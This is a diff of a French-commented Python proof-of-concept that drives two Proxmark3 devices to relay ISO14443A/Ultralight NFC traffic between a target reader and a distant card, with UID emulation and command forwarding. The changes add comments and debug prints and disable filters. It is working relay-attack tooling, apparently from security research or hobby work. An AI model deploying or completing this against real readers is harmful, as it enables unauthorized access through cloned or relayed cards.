@@ -4,14 +4,18 @@ import time
 import re
 import sys
 
+#Dans ce code, je fait beaucoup de time.sleep pour laisser le temps au proxmark de tout filtrer et tout
+#C'est pas très réaliste en terme de gestion de temps mais voila
+
+
 # CONFIGURATION
-PM3_PATH = "./client/proxmark3.exe" # Ou le chemin complet vers ton .exe
-PROXY_PORT = "COM9"
+PM3_PATH = "./client/proxmark3.exe"
+PROXY_PORT = "COM9" #Mon pc est sur windows, donc a modifier si linux
 MOLE_PORT = "COM10"
 
 class PM3Process:
     def __init__(self, port):
-        self.process = subprocess.Popen(
+        self.process = subprocess.Popen( #Plus rapide de faire un Popen et de communiquer via stdin/stdout que de relancer un subprocess.run à chaque commande
             [PM3_PATH, port],
             stdin=subprocess.PIPE,
             stdout=subprocess.PIPE,
@@ -21,11 +25,11 @@ class PM3Process:
         )
         print(f"[*] Connecté au port {port}")
 
-    def send(self, cmd):
+    def send(self, cmd): #envoi de commande au proxmark3 via stdin
         self.process.stdin.write(cmd + "\n")
         self.process.stdin.flush()
 
-    def read_until(self, pattern):
+    def read_until(self, pattern): #réception de la sortie du proxmark3 jusqu'à trouver une ligne contenant le pattern
         while True:
             line = self.process.stdout.readline()
             if not line: break
@@ -44,7 +48,7 @@ class PM3Process:
             self.process.stdout.readline()
 
 def start_relay():
-    print("=== POC RELAI PROXMARK3 (ISO14443A) ===")
+    print("=== POC RELAI PROXMARK3 ULTRALIGHT ===")
     
     # 1. Initialisation des instances
     proxy = PM3Process(PROXY_PORT)
@@ -70,16 +74,18 @@ def start_relay():
     time.sleep(1)
     # 3. Préparation du Proxy (Simulation de l'UID)
     print(f"[*] Simulation de l'UID {uid} sur le Proxy...")
-    proxy.send(f"hf 14a sim -v -u {uid}")
+    #proxy.send(f"hf 14a sim -t 7 -v -u {uid}") 
     print("[*] Mode simulation actif. En attente du lecteur cible...")
 
     # 4. Boucle de relai temps réel
     try:
+        print("[*] Relai actif. En attente du lecteur...")
         while True:
+            print("[*] Surveillance du Proxy...")
             # On surveille le Proxy pour les trames du lecteur
-            # Le Proxmark affiche souvent 'diff' ou 'RX' lors d'un sniff/sim
             line = proxy.process.stdout.readline()
             if not line : continue
+            print(f"DEBUG PROXY: '{line.strip()}'")
             
             
             line_up = line.upper()
@@ -87,21 +93,20 @@ def start_relay():
                 continue
             
             # Recherche d'une trame hexadécimale reçue par le simulateur
-            # Filtre les commandes comme 30 00 (Read Ultralight)
             match = re.search(r'([0-9A-F]{4,})', line.upper())
-            
+            print(f"DEBUG MATCH: '{line.strip()}' -> MATCH: {match.group(1) if match else 'None'}")
+            #c'est une commande et pas un résultat de simulation ou une info du proxmark
             if match and "READY" not in line and "RES" not in line:
                 reader_cmd = match.group(1)
                 print(f"DEBUG BRUT: '{line.strip()}' -> EXTRAIT: {reader_cmd}")
                 
-                if reader_cmd == uid or "SIM" in line.upper() or "PM3 -->" in line.upper():
-                    continue
+                #if reader_cmd == uid or "SIM" in line.upper() or "PM3 -->" in line.upper():
+                #    continue
                 
                 # Éviter de relayer les trames d'anti-collision déjà gérées par 'sim'
-                if reader_cmd in ["26", "52", "9320", "9370"]:
-                    continue
+                # if reader_cmd in ["26", "52", "9320", "9370"]:
+                #     continue
 
-                #if "-->" in line or "sim" in line or "RX" in line:
                 print(f" Lecteur -> [Proxy]: {reader_cmd}")
                 # Transmission au Mole via notre script Lua
                 mole.send(f"script run hf_mole_relay -x {reader_cmd}")
